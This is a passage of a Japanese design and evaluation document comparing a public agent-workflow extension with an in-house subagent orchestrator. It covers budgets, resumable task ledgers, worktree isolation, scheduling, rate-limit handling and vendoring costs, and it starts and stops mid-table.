| 予算 | トークンの柔らかい門と phase の小予算。既定は無制限。金額の上限なし（C-6） | **無い**。往復ごとに時間の上限（`roundTimeoutMs`）と使用量の記録（`children.ts:13,337-340` の tokens・cost）だけ | ○→△ | **予約方式の硬い予算**: 起動前に「見積もりの上限」をトークンと金額で確保し、残りが足りなければ起動しない。超過は「確保済みの分」までに限定。run ごとの合計を可視化。既定を有限にする | 試験: 予算 B・子 N 件で、**確保の合計が B を超える起動が拒否される**。実行中の子の完了後に精算され、合計が B + 誤差（確保分）以内。(A) の「in-flight が超える」ことの対比 |
| 決定的な再開 | 呼び出しの `sha256` と journal（C-4）。副作用・リポジトリの状態は対象外 | **無い**。子の job は idle で残り追加依頼で続けられる（`children.ts`）。親が落ちると全部やり直し。`bundle.py` は取り込みの再開（`continue`）だけ | ◎ | **タスクの台帳**（`.tmp/` 下。task id・入力のハッシュ・**基準 commit と担当ファイルの内容のハッシュ**・状態・結果ファイル）。再開時は、入力と基準が同じ完了済みだけを再利用し、基準が変われば再実行 | 障害の注入: 3 件の `tasks` の途中で親を `kill -9` → 再開で**完了済みの 2 件は再起動せず結果を再利用**、残り 1 件だけ実行。基準 commit を変えると再利用されず再実行されること（(A) は変わらない） |
| JS の DSL（workflow スクリプト） | LLM が JS を書き `vm` で実行（C-1・C-2）。**境界でない。実証済み** | 無い。`tasks`（配列）と `bundle.py`・スキルの手順で組む | × | **宣言的な台帳**（JSON/TOML: タスクと依存・役割・担当ファイル・予算）を `tasks` に渡す。**実行する任意コードを持たない**。分岐が要るときは親（LLM）が次の波を決める | 台帳の検証器が、未知のキー・循環・担当ファイルの重なりを実行前に拒否する試験。任意コードが無いので `vm` の抜けに相当する経路が**存在しない**ことをコードの構造で示す |
| `verify` / `judgePanel` | 固定プロンプトの子 N 人の投票・採点（C-8） | `review` の子（第三者の検証）、`/fleet` が `review` に任せてよいと書く | ○ | 台帳の「検証」タスクとして持つ。**構造化した判定**（根拠の行・反証の試み）を必須にし、票が割れたら人へ上げる。`loopUntilDry` 相当は `maxRounds` と**予算切れを明示のフラグ**で返す | 試験: 全員が失敗したとき `real:false` でなく「判定不能」を返す。予算切れで終わったとき理由が結果に出る（(A) は握りつぶす） |
| worktree の隔離 | 子ごとに作成・**既定で残す**・掃除なし・`lock` なし（C-9） | `worktree.ts`（1,280 行）: `git worktree lock`（`pi-agent <jobId>`）、自分が作ったものだけ掃除、同時数の上限、filter driver の検査。`isolation:"worktree"`（worker のみ）。`scripts/wt_clean.py`・`wt_owner.py` | △（**既に上回る**） | 現状維持。結果の回収（merge）まで台帳で追う | 障害の注入: 子の実行中に親を `kill -9` → 次回起動で lock と所有者から**残骸を検出し回収できる**。公開実装は `pi/wf/*` が残ること（対比） |
| モデル階層・選択 | small/medium/big の json、phase の `model`、`preSpawn` のフック（C-5） | `model-choice.ts`: 役割の既定・カタログ・`model`/`effort` の引数（`resolveChoice`）。親のモデルの継承 | ◎（同等） | 現状維持。階層の名前を台帳に置く | 既存の試験（`test_pi_subagents.py`）で解決の優先順位を固定 |
| 自動起動（キーワード） | 発話中の `workflow` で arming、既定 ON（C-7） | 無い。`/fleet` は**明示のコマンド** | × | 入れない。**「利用者が明示的に頼んだときだけ」を構造で守る**（コマンドかツール引数） | 該当なし（機能が無いこと）。「`workflow` という語を含む普通の質問で、子が 0 件」を確認する試験（回帰） |
| UI（`/workflows` の TUI） | 4k 行超（`workflow-ui.ts`・`task-panel.ts`）。一覧・詳細・pause/kill | `/agents`・`activity`・`board.ts`（227 行）・`/worktrees`。子の完了で親へ通知 | ○ | **台帳の一覧**（状態・使用量・予算の残り・結果のパス）を 1 つの表示に。大きな TUI は作らない | 該当は主観。台帳の合計が `guarded_task` の使用量の合計と一致する試験 |
| 結果の配送・親の待機 | 背景の結果を会話へ戻す。**不具合が多く**、#235 が open（上） | 子の完了通知で親が起きる（idle のまま）。結果は `.tmp/subagents/` に保存、30 分の TTL（`index.ts:947`） | △（**既に上回る**） | 現状維持。台帳へ結果のパスを記録 | 試験: 親が idle のまま 3 件の子の完了を順に受け取る。配送の取りこぼしが 0（(A) の #142・#147・#185 の再発しないこと） |
| 失敗の扱い | 回復可能なら `null`。再試行は `agentRetries`（最大 3） | 往復の状態を `done/blocked/failed/limit/closed/aborted` に**明示で分類**（`children.ts:11,30-40`） | △（既に上回る） | 現状維持。「再試行」は台帳の方針に | 試験: 全ての失敗が `null` でなく分類された状態で返る |
| 使用量の上限到達の自動再開 | `usage-limit-scheduler.ts`（566 行）: 上限が解けるまで待って再開 | 無い | ○（後回し） | 台帳の再開があれば、手動の再開で足りる。自動は需要が出てから | 台帳の再開が先 |
| 共有ストア・エージェント間の KV | `shared-store.ts`（329 行）。子に読み書きのツール | 無い（ファイルと親の仲介） | × | 入れない（担当ファイルの分離と親の仲介を保つ） | — |
| 保存済み workflow・組み込み（`/deep-research` ほか） | 保存した JS を名前で呼ぶ。`/deep-research`・`/code-review` など 5 つ | スキル（`imozuru`・`review-loop`・`feature-orchestration`）とプロンプトテンプレート（`/fleet`） | × | スキルに任せる。`/deep-research` は固定 4 phase で、`imozuru` が上位 | — |

### G 上回るための方針

公開実装の実際の弱点と、自作での解消:

| 弱点（根拠） | 自作での解消 |
| --- | --- |
| `vm` が境界でない（C-2。実証） | **任意コードを実行しない**。台帳は宣言的な JSON/TOML。分岐は親（LLM）が波ごとに決める |
| 子がガード外（`agent.ts:992`） | 既に別プロセス + ハーネス。維持する |
| 予算が既定なし・柔らかい・金額なし（C-6） | 予約方式の硬い予算（トークンと金額）。既定を有限に |
| 再開が副作用・リポジトリの状態を見ない（C-4） | 台帳に基準 commit と担当ファイルの内容のハッシュを入れる |
| worktree が残る（C-9） | `git worktree lock`・所有者の記録・掃除（既に実装） |
| 失敗が `null` で流れる（`workflow.ts:1550`） | 状態の明示の分類（既に実装） |
| 配送の脆さ（#235） | 子の完了通知（既に実装） |

**自作でしか得られない強み**: 全ての子がフルガード下（判定・確認・伏字化・承認の中継）。予算と費用の合計の可視化（これから）。決定的な再開（これから）。
親が idle のまま通知で起きる運用。`feature-orchestration` と `bundle.py` による「worktree → 検査 → 取り込み」の閉じた流れ（公開実装は merge を利用者へ残す）

**上回れない・価値が薄い点（正直に）**:

- **1000 件の fan-out**: 公開実装は規模に強いが、自作の用途（リポジトリの実装・検査・調査）で**実効の並列は 3〜5**（O2 の調査、[pi-orchestrator-survey](pi-orchestrator-survey.md)）。
  フルガードの確認や worktree の費用も、規模に比例して重くなる。需要が実測で出るまで上げない
- **JS の DSL**: 表現力は台帳より高い（ループ・条件・動的な分割）。**自作は表現力で劣る**。ただし LLM 書きの任意コードが境界の外で動く費用と引き換えで、
  用途の大半は「依存つきの波」で足りる（`/fleet` と `tasks`）。動的な分割が必要な場合は、親が波ごとに台帳を書き換える
- **成熟度**: 公開実装は 100 件超の不具合を潰した細部（drain・grace・lock・使用量の確定・TUI）がある。自作の台帳・予算は**新規で、同等の細部に達するまで時間がかかる**。
  ここは正直に劣後する
- **`tasks` + bundle で足りるか**: 足りる。足りない 2 点（予算・再開）が MVP

**最小で上回るセット（MVP）**:

1. **台帳（task ledger）**: `.tmp/` 下の JSON。task id・役割・担当ファイル・入力のハッシュ・基準 commit・状態（既存の 6 分類）・結果のパス・使用量。`guarded_task` が書く
2. **予約方式の予算**: 台帳に `budget`（トークン・金額）。起動前に確保、完了で精算。残りが足りなければ起動しない。run 単位の合計を表示
3. **再開**: 台帳から、入力と基準が同じ完了済みを再利用して残りを実行（`guarded_task` の `resume` か `/fleet` の手順）
4. **検証**（上の 3 つを確かめる試験）: 子 3 件の途中 kill → 再開、予算超過の拒否、基準変更で再実行

**後回し**: 構造化した検証タスク（`verify` 相当）・使用量の上限到達の自動再開・台帳の一覧 UI・並列数の見直し

### H vendor 判断の材料

| 項目 | (A) の実測 | 含意 |
| --- | --- | --- |
| 検査すべきコード量 | `src` 25,976 行（TypeScript 55 ファイル）。**核**（`workflow.ts` 2,912・`agent.ts` 1,721・`worktree.ts` 148・`run-persistence.ts` 802・`run-record-store.ts` 501・`fs-persistence.ts` 210・`shared-store.ts` 329・`usage-limit-scheduler.ts` 566）で約 7.2k 行。UI・guidance・comprehension・release gate が約 12k 行 | 核だけ読んでも約 7k 行。UI を捨てて核だけ vendor しても、`workflow-manager.ts`（2,487 行）への結合が残る |
| 依存 | 実行時 `acorn` 1 つ。peer の pi 3 つ（版が `>=0.80.8` と広い）。lockfile 4,593 行（開発依存を含む） | **供給網は軽い**。ただし pi の内部 API（`sessionManager.buildSessionProjection` など「pi 内部の継ぎ目」）に依存し、CI が pi 1.x へ再解決して追っている |
| install スクリプト | 無し | 軽い |
| ネットワーク・fs・exec の呼び出し箇所 | exec: `execFile`（git。`worktree.ts` 内）+ `spawn`（`builtin-commands.ts:90`）の 4 箇所。ネットワーク: `fetch` 1 箇所（`web-tools.ts:26`。Bing へのスクレイピングを含む）。fs: 書き込み・削除は run 永続化・設定・ログ・worktree の掃除で多数（`writeFileSync`・`unlinkSync`・`rm` の呼び出しが約 40 行） | exec・ネットワークは少なく検査しやすい。**fs の書き込みが広い**（`~/.pi/workflows/` 以下と、リポジトリ内 `.pi/`） |
| 更新頻度と追従費用 | 直近 90 日で 84 commit（週 6〜7）、月 15〜75。バージョンは 3.15.0（2026-10-27）。バス係数 1 | fork すると**毎リリースで再検査**が要る。追従しなければ pi 本体の更新（1.4.0 → …）と互換が切れる |
| ライセンス | MIT（同梱・再配布可） | 適合。表示を残す |
| subagent をフルガード下で動かす改造 | `agent.ts:1385-1450` の `createAgentSession` を、**別プロセスの `pi --mode rpc` の子**へ置き換える（`children.ts` と同等）か、同一プロセスのままガードを載せる。**前者は (A) の使用量集計・journal・abort の結線を全部書き換える**ことになり、事実上別物。後者は上の E-4（未検証） | **改造の費用が最大の不確定要素**。核の 7k 行の理解 + 書き換え |

**概算の費用比較（推測。根拠は行数と 1 日あたりの読解・実装量の経験則）**:

| 方式 | 内容 | 見積もり |
| --- | --- | --- |
| vendor ＋ 検査 ＋ パッチ | 核 7.2k 行の検査（1 人日 ≒ 1,000〜1,500 行の精読として 5〜7 人日）+ `vm` の置き換え（別プロセス化。設計 + 実装 + 試験で 3〜5 人日）+ 子のガード化（5〜10 人日）+ 追従（リリースごとに 0.5〜1 人日、直近の頻度で月 2〜4 人日） | **初回 13〜22 人日 + 月 2〜4 人日**。しかも (A) の強みの多く（journal・予算）の細部を自分で理解して保つ必要 |
| 自作の MVP | 台帳（約 300 行）・予約方式の予算（約 150 行）・再開（約 200 行）・試験（kill・予算・基準変更）。`children.ts`・`index.ts` の既存の結線を使う | **5〜8 人日**。追従費用は 0（外部の更新に依存しない）。成熟度は劣る |

**結論**:

- **自作が上回れる条件**: (1) **任意コードを実行しない設計を保つ**（これだけで `vm` の抜けに相当する領域が消える）。(2) MVP の 3 点（台帳・予算・再開）を入れる。
  (3) 「並列 3〜5・用途はリポジトリの作業」という前提が続く。規模（数百件の fan-out）が実需になったら再評価する
- **vendor した方が良い領域**: **現時点では無い**。部分的に**設計を借りる**のが妥当: `callHash` の項目の選び方（`workflow.ts:2770`）、予算の再開をまたぐ累積、drain と abort の順序、
  `resumeMode` の 2 方式。コードの vendor ではなく**仕様の借用**（ADR-0016 の「参考実装を読んで設計だけ借りる」に合致）
- **vendor が逆転する条件**: 利用者が「JS で書く動的なワークフロー」と「数百件の fan-out」を実際に必要とし、かつ**ガードの外で動く**ことを受け入れる（OS 層の隔離だけに頼る）場合。
  その場合も `vm` の置き換えは必須

### I 未確認・限界

- 実モデルでの run・`/workflows` の TUI・Windows・pi 1.4.0 への導入は**動かしていない**。(A) の `peer` は pi `>=0.80.8` で、1.4.0 での動作は未確認
- E の「ガード下の穴」は**コードの読みからの推論**。子にガードを載せる経路（`providerMiddlewareExtensions`）が成立するかは未検証
- `vm` の抜けは**スタブの agent で `runWorkflow()` を直接呼んだ**再現。実際の `workflow` ツール経由（モデルが書いたスクリプトの `meta` 検査・正規表現・prelude を含む全経路）は、
  `runWorkflow()` が同じ関数を呼ぶので同じはずだが、ツール経由での再現はしていない
- `createLimiter` の上限超過は**再現しなかった**（推測のまま）
- 子のシェルのプロセスグループの回収・worktree の `.gitignore` 追加の有無・`pi-crew` など (A) が言及する他の拡張は未読
- issue の「closed の 30 件程度」は題名と一部の本文で分類した。本文を全部は読んでいない（#231・#107・#24・(B) の PR #18 は本文を読んだ）
- 工数の見積もりは**推測**
- 依頼文の「(A) の `/deep-research`」「skills 2 件」「同時 16・合計 1000」「`keepWorktree` 既定 true」は確認できた。**依頼文の「9 件の概要」と違った点**: (A) は予算を**持つ**
  （トークンのみ・既定なし）、キーワードは**許可であって強制ではない**、`src` は 55 ファイル 26k 行で想定より大きい

### J 並列度を上げる設計の借用

利用者の狙い: **並列度を可能な限り高める**。自前で上げようとして詰まった経験があるので、公開実装の設計から**使えるアイデアを仕様として借りる**。
（コードの vendor は H で否定したまま。借りるのは考え方で、ADR-0016 の「参考実装を読んで設計だけ借りる」に合う。実行した確認は C-2・C-3 のみで、
以降の「借用案」の検証は設計案。出典の行番号は (A) 3.15.0 の `.tmp/research/pi-dynamic-workflows/sources/repoA/src/`）

#### J-0 うちの並列度の上限を決めているもの

| 層 | 今の上限（根拠） | 公開実装で効く設計（J-1〜J-4） | 効かない点 |
| --- | --- | --- | --- |
| 資源 | 子の生存は 6（`index.ts:936` `MAX_JOBS`）。子は別プロセスの RPC（`index.ts:1277`）。1 回の `tasks` は 12 件（`children.ts:55`） | 同期の枠予約・FIFO の門・空き待ち（J-1）。ただし (A) の子は**同一プロセス内**で、それでも OOM が出た（#109）。別プロセス方式は資源の上限が先に来るので、同時数は上げすぎない | 16 や 1000 という数は根拠が実測でない（J-5）。真似ない |
| 協調 | 担当ファイルは**親が手で割り当て**て重ならないようにする。`/fleet` の波は 4 件まで、波ごとに親が結果を読む（`[pi.commands.fleet]`）。worker は worktree を 1 つずつ | **波の壁を作らない `pipeline`**（J-1）、`needs` で依存を持つ台帳（J-3）。**書き込み集合の宣言で、重なる子だけ直列に**（(A) には無い。J-2） | (A) は同じファイルを触る子の衝突を**防がない**（worktree に分けて merge を利用者へ残す） |
| 親 | 親が子の結果を読み（返答の上限 `MAX_REPLY_CHARS = 20000`、`index.ts:937`）、確認し、コミットする。**親の文脈と注意が律速** | 中間結果をスクリプト側の変数・ファイルに置き、親へは最終の返り値だけ（J-4）。完了は通知（background が既定） | (A) も配送の不具合が多い（J-6）。親に戻す量を絞る設計が要る |
| 検証 | 全件検査は排他ロックで全 worktree・全会話に 1 本（`scripts/verify.py:973`。約 9〜12 分。`parallel-ops.md`） | (A) に相当物は無い（検証は子の LLM 投票）。借りられるのは「検証を台帳の 1 ノードにして、前段の完了から順に流す」考え方だけ | 全件検査の直列は (A) では解けない。**まとめて 1 回（bundle）で検査する方が効く**（既に持つ） |
| 統合 | 利用者の「統合する」の押下は 1 件ずつ。`bundle.py` で複数 feature を 1 本にまとめる | (A) は merge を行わず `keepWorktree` で残すだけ。**借りるものは無い** | 自作が既に上。統合の直列は設計の方針（承認の境界） |

**要点**: 並列度の上限は、(1) 資源と (2) 協調の設計より、**(3) 親の待ちと文脈**と **(4) 検証・(5) 統合の直列**で決まっている。
公開実装が効くのは (2) と (3) の一部（壁を作らない流し方・中間結果を親の文脈に入れない・予算と再開で大きな fan-out の事故を小さくする）。
(4)(5) は公開実装に答えが無く、自作の bundle と承認の設計で解く。

#### J-1 スケジューラの実装

| 項目 | 公開実装の実装（ファイル:行） | 借用の判断 |
| --- | --- | --- |
| 同時数の制御 | `createLimiter(limit)`（`workflow.ts:2641`）。実行中の数と待ち行列だけ。`concurrency` は 1〜16 に丸め（`workflow.ts:2862`、`config.ts:12`）、既定は `hardwareConcurrency - 2`（`workflow.ts:854`）。再試行の待機中も**枠を持ち続ける**（`README.md:247`） | 単純でよい。**上限は固定にせず、429 の観測で動かす**（下の「429」）。枠は子の起動前に取る |
| 枠の予約 | `maxAgents`（既定 1000）は `agent()` の呼び出し時に**同期で予約**（`workflow.ts:1163`）。fan-out が上限を超えたら、その batch の待機中の子を起動前に捨てる（`batch.cancelled`、`workflow.ts:1595-1600`）。`verify`・`judgePanel` は件数を事前に確認（`ensureAgentCapacity`、`workflow.ts:1849-1900`） | ○ **起動前に「何件・いくら」を確保して、足りなければ始めない**。台帳の予約（G の MVP）に使う |
| キューの順序 | FIFO（`queue.shift()`）。優先度・公平性・重み付けは無い | △ FIFO は同じ。**優先度（臨界路の先頭・検証の待ちを短く）は自作で足せる** |
| DAG・依存 | 組み込みの DAG は**無い**。依存は JS の `await`／Promise 連鎖が表す。`pipeline(items, ...stages)` は項目ごとの段の連鎖で、**項目どうしに壁が無い**（`workflow.ts:1627-1674`）。`parallel` を `await` するとそこが壁 | ◎ **最も効く借用**。`/fleet` は「波ごとに全員そろうまで待つ」。**波をやめて、完了した子から順に次段（検証・次の作業）を起動する**。台帳の `needs` で表せる（J-3） |
| フェーズの意味 | `phase(title, {budget})`（`workflow.ts:914`）。**名札と小予算だけ**で、壁ではない。壁になるのは `await parallel(...)` | 名札と予算の単位として借りる。壁にしない |
| 背圧 | **無い**。全ての thunk を一度に起動し、門の待ち行列に溜まる（件数は `maxAgents` で頭打ち。1000 件の待機クロージャ）。生産側を遅らせる仕組みは無い | ○ 台帳は「ready の一覧」から**空き枠の分だけ**取り出す方式にする（待機件数が不要）。(A) より有利 |
| 429・レート制限 | `errors.ts:159` の正規表現（`usage limit`・`quota`・`rate limit`・`too many requests`・`429`・`billing` ほか）に当たれば `PROVIDER_USAGE_LIMIT`（**回復不能**、`errors.ts:214`）。run は失敗でなく**一時停止**（チェックポイント）。`UsageLimitScheduler`（`usage-limit-scheduler.ts`）が provider の「リセットまで」のヒントを読み、最小 60 秒・既定の代替 300 秒・最大 6 時間、最大 5 回、ジッター付きの指数バックオフで `resume()`（定数は `:92-95`）。**一過性の過負荷・5xx は「回復可能」として再試行**（`errors.ts:153-154`）。**同時数を動的に下げる処理は見当たらない**（`adaptive\|AIMD\|halve` で grep して 0 件） | ◎ 借りる:「**429 は再試行せず、一時停止して journal から再開**」（再試行の嵐を避ける）。**上回る**: 429 を見たら**生存の上限を半分にし、成功のたびに 1 つ戻す**（AIMD）。(A) は同時数を下げないので、上限 16 のまま叩き続けうる（推測） |
| 再試行 | 回復可能な失敗だけ、最大 3 回（`MAX_AGENT_RETRIES`）。待機は `min(250·2^(n-1), 2000)` ms（`workflow.ts:1508`）。失敗した試行の共有ストアへの書き込みは取り消す（`discardDelta`、`workflow.ts:1486`）。**空の出力（`AGENT_EMPTY_OUTPUT`）も回復可能として再試行**（`workflow.ts:1437`） | ○ 同じ。「空の出力」を失敗として扱う点が実用的（#4 の `null` の多発への対処） |
| 部分失敗の継続 | 回復可能な失敗は `agent()` が `null` を返し、`parallel`／`pipeline` は他を止めずに `null` を結果に入れる（`workflow.ts:1597-1611`）。**回復不能**（予算・枠・使用量の上限）は run 全体を止める。`maxAgents` 超過だけ、その batch を cancel | △ **`null` は使わず、`{id, status, reason}` の台帳**で返す（pattern-selection の「失敗の台帳」と同じ考え）。継続と停止の境界は借りる |
| キャンセルの伝播 | 外部の abort（`options.signal`）と、run が「致命」と確定したときの `runFatalController` を、子ごとの `AbortController` に連結（`workflow.ts:1300-1330`）。試行ごとに連結を外す。致命のとき、**途中の兄弟は捨てる**（journal に入らず再開で再実行。コメント `workflow.ts:2241-2260` に明記）。終了時に `drainAbortGraceMs`（既定 10 秒）だけ子の後始末を待つ | ○ 順序（signal → 子の dispose → 使用量の確定 → grace）を借りる。自作は子が別プロセスなので `kill -pgid` を使う（既に実装。`children.ts:424`） |
| タイムアウト | `agentTimeoutMs`（`withTimeout`、`workflow.ts:2880`）。**既定は無し**（`config.ts:9` `null`）。止まった子を検知する watchdog も無い（#150 の作者回答） | △ 自作は往復ごとの時間の上限が既にある（`roundTimeoutMs`）。**無出力が続いたら steer、さらに続いたら abort する stall の watchdog** は (A) も未実装で、自作が上回れる点 |
| 再開（資源の無駄を減らす） | `callHash` による journal（C-4）。予算も再開をまたぐ | ◎ 並列度を上げるほど「途中で落ちたときの損」が大きくなる。**再開は並列度の前提条件**（G の MVP 3） |

#### J-2 並列に走らせても衝突しないための仕組み

| 論点 | 公開実装 | 自作の現状 | 借用・上回る案 |
| --- | --- | --- | --- |
| 隔離 | `isolation:"worktree"` で**子ごと**に worktree と枝を作る（`worktree.ts:58`）。失敗時は共有の作業ツリーへ**落とさず止める**（`workflow.ts:1284`） | worker 1 つにつき 1 worktree（lock つき、所有者の記録） | 失敗時に落とさない点は同じ。**子の単位でなく、台帳の task の単位**で worktree を持つ（task の内部の複数の子は同じ worktree を共有してよい） |
| 回収 | `keepWorktree` 既定 true（merge のために残す）。自動 merge は無い。**掃除も無い**（C-9）。結果の返り値に worktree のパスが入る（`workflow.ts:1523`） | 検証後に `bundle.py` で 1 本にまとめて取り込む。`wt_clean.py` で掃除 | 自作が上。台帳に「worktree・枝・状態（生きている／回収済み／残骸）」を持たせる |
| 共有ファイルの競合 | **検出も防止も無い**。`worktree.ts:3` のコメントは「同じファイルを競合なしで編集できる」とだけ。重なる変更は merge で初めて分かる | 担当ファイルを親が決めて重ねない。重なったら `bundle.py` が衝突で止まる（終了コード 3） | ◎ **上回れる点**。task に**書き込み集合**（`writes: [glob...]`）を宣言させ、台帳のスケジューラが**重なる task を自動で直列に**する（重ならない task は並列）。親が手で割り当てる作業が消え、並列度が上がる |
| 同じファイルを触る子の直列化 | **無い**。`thread`（同じ名前の連続した会話）だけ、同時実行を**拒否**する（`workflow.ts:1031` `activeThreads`）。直列は作者が `await` で書く | 親が波の順に分ける | 上の `writes` の重なり判定。**共有されやすいファイル**（`common.toml.tmpl`・golden・索引）は「予約」として排他にする（既に運用ルール） |
| マージの順序 | (A) は行わない | `bundle.py start <feature>...` の順に取り込む。衝突で停止し worker に解消を頼む | 台帳の `needs` と `writes` から**取り込み順を決める**（重ならないものを先に、衝突しそうなものを後に）。借りるものは無い |
| 共有の状態 | `SharedStore`（`shared-store.ts`）: 子どうしのメモリ上の KV。**同じキーは後勝ち**。失敗した試行の書き込みを undo する履歴（#208）。journal の差分として再生 | 無い（ファイルと親の仲介） | × 入れない。共有の状態はファイルと台帳に限る（再生できず、競合の原因になる） |
| 結果の集約（reduce） | **JS が列挙し、`ledger`（全ての意図した ID と `complete`／`failed`）を作って、synthesize の子 1 人に渡す**（`skills/workflow-authoring/examples/fan-out-and-synthesize.js`）。欠けた ID を黙って落とさず、「失敗・未カバー」を明示するのが不変条件 | 親が各子の返答を読んで統合 | ◎ **借りる**: reduce を親でなく**台帳の 1 ノード**（`reduce` 役の子、または決定的な集計）にし、入力は台帳の ID と結果のパスだけ。親の文脈に全文を入れない（J-4） |

#### J-3 LLM を使わない決定的な部品と、宣言的な仕様での置き換え

(A) 自身が境界を明文化している（`skills/workflow-authoring/references/pattern-selection.md:3`、MIT）:

```text
Choose from data dependencies, then read only the matching example. JavaScript owns enumeration,
identity, ordering, deduplication, bounds, stopping, brackets, and failure ledgers.
Agents own semantic work.
```

| 部品 | 決定的な部分（コードが持つ） | LLM が要る部分 | 宣言的にできるか |
| --- | --- | --- | --- |
| `parallel(thunks)` | 列挙・入力順の保存・`null` の扱い・全部そろうまで待つ | 各 thunk の中身 | ○ `foreach: <配列>`＋テンプレート |
| `pipeline(items, ...stages)` | 項目ごとの段の連鎖、段への `(prev, item, index)` の受け渡し | 各段の中身 | ○ `stages: [..]` を項目に適用。段の出力を次の入力に |
| `phase`・`log`・`args`・`budget` | 名札・記録・入力・残りの予算 | — | ○ 台帳の項目 |
| `retry`・`gate`（`workflow.ts:1986-2030`） | 回数・`until` の判定・フィードバックの文字列化・「次の試行のハッシュは前の結果に依存」 | 試行の中身・`gate` の validator が LLM のとき | △ 回数と `until`（スキーマ検証・正規表現・終了コード）は宣言できる。**validator が任意の JS だと宣言に収まらない** |
| `loopUntilDry` | キーによる重複排除・「新規ゼロが連続 N 回」・`maxRounds`・予算切れで打ち切り | 各 round の中身（探索） | ○ `repeat: {key, consecutive_empty, max_rounds}` |
| `judgePanel` | 平均・同点は入力順・件数の事前確認 | 採点 | ○ `panel: {judges, rubric}`。集計は決定的 |
| `verify` | 閾値の投票（`real` の割合）・票ゼロは偽 | 反証の試み | ○ `quorum: {reviewers, threshold}` |
| トーナメント | **ブラケットの組み方・bye・勝者の進め方**（`examples/tournament.js`） | 1 対 1 の判定 | ○ `bracket:`。組み方は決定的 |
| `schema`（構造化出力） | 出力が JSON Schema に合うかの検証・`type:"object"` の強制（`agent.ts:1226`） | 中身 | ○ そのまま JSON Schema |
| 保存済み workflow・`workflow(name,args)` | 名前での解決・1 段の入れ子・親の上限の共有 | — | ○ `include: name` |
| journal・`callHash` | 身元のハッシュ・再生の判定（prefix / replay-completed） | — | ○ 台帳の入力ハッシュと状態 |
| `meta` の読み取り | `acorn` の AST から**リテラルだけ**を取る（`workflow.ts:2517`）。計算・展開・メソッドを拒否 | — | 既に宣言的（JS 風の記法を借りた JSON） |

宣言的な仕様（JSON/TOML/YAML）の表現力と限界（**見立て。実装していない**）:

- **表せる**: (A) の 6 つのパターン（分類して処理・fan-out して統合・敵対的検証・生成して絞る・トーナメント・終わるまでループ）は、いずれも
  「列挙・並行・`null` を許す全員待ち・集計・上限」の組み合わせで、**宣言できる**（`pattern-selection.md` の不変条件は、台帳の検証器の規則になる）。
  依存は `needs`、並行は `foreach`、反復は `repeat`、条件は小さな式（`when: result.risk == "high"`。**チューリング完全にしない**）
- **表しにくい**: (a) 結果に応じて**任意に増える**分割（ただし「前段の出力のスキーマ上の配列を `foreach` する」ことは宣言できる。`expand: $stage.items`）、
  (b) 段の間の**任意の文字列加工**（テンプレートの補間で足りる範囲を超える計算）、(c) 任意の validator・任意のキー関数。
  (b)(c) は**許可リストに載せた決定的な補助コマンド**（例: 重複排除・ソート・JSON の整形。引数と出力が JSON）を `run:` で呼ぶ形にすれば、
  **任意コードを台帳に書かせずに**済む。それでも収まらないものは、親（LLM）が次の波の台帳を書く（動的な分割を親の仕事にする）
- **得るもの**: `vm` の抜けに相当する経路が**構造上存在しない**（実行する任意コードが無い）。台帳は実行前に**静的に検査できる**
  （未知のキー・循環・`writes` の重なり・予算の見積もりの合計）。(A) は JS を書かせるので、これらを実行前に検査できない
- **失うもの**: 表現力（ループの中の細かい制御・動的な分岐）と、LLM が JS を書く手軽さ。**ここは自作が劣る**。ただし (A) の例の長さは 1.3〜3.0 KB で、
  読んだ `fan-out-and-synthesize.js`・`tournament.js` は `map`・`filter`・`Set`・単純なループだけだった（残りの例は未読）ので、**実用の大半は台帳に収まる**と見る（推測）

#### J-4 親の文脈と待ち時間を減らす設計

| 設計 | 公開実装（出典） | 自作への借用 |
| --- | --- | --- |
| 親が待たない | `workflow` ツールの `background` は**既定 true**。呼ぶとすぐ run ID を返し、**ターンが終わる**。結果は完了時に会話へ自動で戻る（`workflow-tool.ts` のツール説明、`WORKFLOW_GATE_GUIDELINE`、`README.md:318`）。`workflow_control` で steer・pause・resume | 同じ（`guarded_task` の background と完了通知）。**台帳 1 つを 1 回の呼び出しで起動する**と、親の往復が 1 回になる（今は子ごと・波ごと） |
| 中間結果は親の文脈に入れない | **ワークフローのデータの流れは、スクリプトの変数の中**（`ledger`・`results`）。親の LLM が見るのは最終の `return` だけ。子の最終報告は `agent()` の返り値としてスクリプトへ入り、親へは出ない | ◎ 台帳の中間結果は**ファイル**（task ごとの結果のパス）に置き、親へは `{id, status, 要約 ≤200 字, パス}` だけ。reduce の子がファイルを読む |
| 返り値を構造化する | `schema` つきの `agent()` は `structured_output` ツールで JSON を受け取る（`agent.ts:1226`）。親へ返す量を型で絞れる | ○ 子の返答の形を task の `schema` で固定し、親が読む量を一定にする |
| 親へ返す量の上限 | 配送される結果は短く切られる（#55: 400 字で切れてポインタが無かった → 修正）。全文は run ファイルに保持（`README.md:320`、最新 300 件） | ○ 親へは要約、全文はパス。**切ったら必ずパスを付ける**（#55 の教訓） |
| 進捗は UI へ | `/workflows` の TUI・widget に集計（`display.ts`・`task-panel.ts`）。親の LLM の文脈を使わない | ○ 台帳の一覧（状態・使用量・予算）を表示に出し、親の文脈に載せない |
| 失敗の原因を親へ | #231: 上流の 402 が `AGENT_EMPTY_OUTPUT` に潰れた（3.14.0 で修正）。**親が原因を読める形で返さないと、親が調査して待ちが増える** | ○ 台帳の `reason` に provider のエラー本文の要点を残す（自作は `blocked`・`failed` の分類が既にある） |

#### J-5 並列度の実測・報告

- **同時 16 の根拠**: 実測ではない。`config.ts:11` のコメントは「Claude Code の上限に合わせた」（`Maximum concurrent agents (matches Claude Code limit)`）。
  合計 1000 は**安全のための上限**（`workflow-tool.ts` の `maxAgents` の説明に `safety`。「大きな fan-out は利用者の明示の意図を要する」）
- **README・docs・issue にベンチは無い**。`README.md` で費用・所要時間の見積もりを探したが、**典型的な費用・所要時間の表は見つからなかった**
  （ツールの説明は「並列を提案するときは大まかな費用を添えよ」と書くだけ。`workflow-tool.ts:25`）
- **実例の数字（issue）**: #231 の報告に、13 体のレビューの 1 ラウンドで **1.1M トークン**（1 体あたり約 8.5 万。推測の割り算）。#4 では高並列で、
  約 300 トークンで終わる子が**多数 `null`** を返した（`AGENT_EMPTY_OUTPUT`。2.1.0 で一部修正後も残った）
- **含意**: 16〜1000 は**数の主張であって、並列の効率の主張ではない**。借りるべきは数ではなく、上の J-1〜J-4 の制御の設計

#### J-6 公開実装がうまくいっていない並列のケース（issue）

| 症状 | issue | 原因と含意 |
| --- | --- | --- |
